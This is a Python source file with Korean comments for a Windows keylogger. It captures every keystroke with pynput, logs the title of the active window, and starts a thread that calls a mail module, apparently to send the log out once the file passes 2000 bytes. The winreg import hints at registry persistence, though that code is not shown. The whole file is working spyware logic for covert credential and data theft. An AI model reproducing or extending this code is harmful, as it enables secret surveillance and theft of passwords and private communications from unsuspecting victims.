import os
import time
import winreg
import fdmailmanager
import filemanager
import winmanager 
from threading import Thread
from pynput.keyboard import Key, Listener

#키 입력 감지 함수
def on_press(key):
    filemanager.logger(key)
    print(key)

#윈도우 타이틀 감지함수

def wintitle():
    oldtitle = winmanager.gettitle()
    while True:
        time.sleep(0.15)
        if winmanager.gettitle() != oldtitle:
            filemanager.logger("\n" + winmanager.gettitle() + "\n")
        oldtitle = winmanager.gettitle()


#파일 사이즈 감지 함수

def rsc():
    MAX_FILE_SIZE = 2000 #
    while True:
        time.sleep(1)
        if filemanager.getfilesize() > MAX_FILE_SIZE:
            print("file size over")
            fdmailmanager.main()

def main():
    with Listener(on_press=on_press) as listenser:
        listenser.join()

mainThread = Thread(target=main)
titleThread = Thread(target=wintitle)
RSCThread = Thread(target=rsc)

mainThread.start()
titleThread.start()
RSCThread.start()